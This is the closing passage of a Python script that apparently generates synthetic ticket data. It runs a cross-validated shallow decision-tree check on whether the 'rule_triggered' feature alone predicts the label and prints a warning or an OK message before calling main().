    print("\nRunning rule_triggered-only baseline sanity check (5-fold CV, shallow decision tree)...")
    baseline_acc = _rule_only_baseline_check(tickets)
    print(f"  rule_triggered-only accuracy: {baseline_acc:.2%}")
    if baseline_acc >= 0.95:
        print("  WARNING: rule_triggered alone still near-perfectly predicts the label.")
        print("  Label-ambiguity injection did not work — increase overlap in TEMPLATES base_weights.")
    else:
        print("  OK: rule_triggered alone is NOT a near-perfect predictor.")
        print("  Other engineered features should carry real signal for the 7-model comparison.")


if __name__ == "__main__":
    main()
